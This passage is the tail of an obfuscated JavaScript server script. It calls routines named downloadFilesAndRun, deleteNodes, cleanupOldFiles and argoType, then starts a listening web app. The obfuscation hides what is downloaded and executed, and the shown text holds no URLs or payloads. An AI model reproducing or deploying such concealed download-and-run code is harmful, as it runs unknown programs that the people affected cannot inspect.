console[_0x4a69ef(0x18e)](_0x4a69ef(0x176)+_0x4aaaf6[_0x4a69ef(0x18c)]),null;}}async function startserver(){const _0x362da1=_0x1880f1;try{argoType(),deleteNodes(),cleanupOldFiles(),await generateConfig(),await downloadFilesAndRun(),await extractDomains(),await AddVisitTask();}catch(_0x9c353f){console[_0x362da1(0x18e)](_0x362da1(0x19b),_0x9c353f);}}startserver()[_0x1880f1(0x1fc)](_0x2da95a=>{const _0x2ecf65=_0x1880f1;console[_0x2ecf65(0x18e)](_0x2ecf65(0x19f),_0x2da95a);}),app[_0x1880f1(0x20c)](PORT,()=>console[_0x1880f1(0x21a)](_0x1880f1(0x182)+PORT+'!'));
